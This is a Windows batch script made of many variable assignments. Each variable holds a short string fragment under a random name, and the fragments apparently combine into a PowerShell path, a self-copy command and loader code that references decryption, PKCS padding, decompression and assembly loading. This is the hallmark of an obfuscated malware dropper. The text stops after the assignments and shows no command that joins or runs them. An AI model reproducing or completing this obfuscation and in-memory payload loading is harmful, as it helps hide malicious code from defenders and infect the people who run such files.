@echo off
set "tScIbmXLtd=.e"
set "eanIFysqfU= C"
set "GoWMCutoIp=nd"
set "lGwMTqFYsD= /"
set "MpvwoTyvcf=Sy"
set "MIiwMQchID=we"
set "WorfoxiksP=st"
set "oQrUqkvxef=in"
set "aSAPljTkiW=ow"
set "DualeOzXVo=y "
set "pZZvhNLkqN=we"
set "JkoWuCUJue=ll"
set "wcVmBLAksg=1."
set "qIZEYEMcVJ=Wi"
set "ckveSDtLqs=Po"
set "gSxzBFbpVv=po"
set "LBUYriJBJg=em"
set "vHXoOsjGJu=co"
set "BTVMfydupy=rs"
set "TXukpbenTq=ll"
set "iuhFAqDavp=:\"
set "tKFGDKweBr=32"
set "QDzPdaCIej=he"
set "BGZwOkclVj=xe"
set "adJaenuRYo=ws"
set "GCGXBDFwLW=he"
set "KxhcadgzgF=\W"
set "uvWBEkgqPd=rS"
set "ldggUwaLmC=0\"
set "rxFucwbJJb=s\"
set "kXMWMmJKCE=do"
set "EaPImVxbKt=py"
set "BkBkUHnTzH=\v"
set "hkNGCQwaHC= %~dp0"
set "uhHBjGXXFU=cd"
set "kzpsItjTAX=sT);"
set "gkcMUTlpRr=Wyqo"
set "QHoTJAJKOb== [S"
set "RwSSFKMoPE=em.I"
set "BwyawClLPZ=V = "
set "TlyXGAmlXY=TllA"
set "OhxZkaQHYV=);$t"
set "RozOLcngSt=)($w"
set "nqBpLEQnkr=join"
set "eTbEOAyDfs=();$"
set "ELfDFsFJvd=Star"
set "zQQBkxDTCQ=rt]:"
set "scDUdFTpar='oPV"
set "GTWMqikyYh=PKCS"
set "PqZfRBDQpa=..-1"
set "AxwQmzFgME=W = "
set "xrlTdDkVni=T = "
set "hJAaQcMsLD=-joi"
set "VXDAFRvaAG=ion."
set "SAdZbYLUxd=YC.D"
set "rtVYUaAsQo=pher"
set "QNwoTbxTpi=wMms"
set "iZGcOTCZiq=1] -"
set "hYkfBbpfqR=eam("
set "ZzmExMZlpP=nage"
set "eUfNnzcUue=embl"
set "jGeNPxxuyC=Fina"
set "SAMLnwSAQv=in $"
set "FlaNIzNJkg=AokH"
set "XksdKEZOec=zm83"
set "YpZVLclQZr=.Ass"
set "sVOAIMcYwU=sion"
set "PDXPzpHPVA= if "
set "MzrCQxRgum=P) {"
set "CiYseDCfIG=gnir"
set "zcfwlRkQOy=);$A"
set "DQAiZKgrBP=nW, "
set "hrmMiBFhSP=lit("
set "GQEeRNJbYW=2VUN"
set "qOdOReJZuA=yLY "
set "pQCOlitZem='gni"
set "UzrgEVPPvc=[Env"
set "WdGYESoQiP=.Com"
set "dEsBVhTHCJ=HO3I"
set "JvPanSniVg=O.Me"
set "GaIphlrYfm=y]::"
set "bVoQDxJWTQ=.Cry"
set "YbbqMnCMRT=AoJY"
set "qXhzCpHnuX=daeR"
set "VDzVtXdvkK=gUiz"
set "ahHbSxOkCg=('ev"
set "GiVORaQjVc=FodF"
set "aOqjwoQbQh=ateD"
set "OSIYNswjoU=Syst"
set "VFJIBJufyV=ing("
set "pUzjdwlkIH=yLY."
set "TSbitEBCeR=CuSj"
set "lNGfaxHwNN=;$yb"
set "lQzhUtrAsm=ct S"
set "LmMrjbfkvL=THxh"
set "NiqxSQVhwK=File"
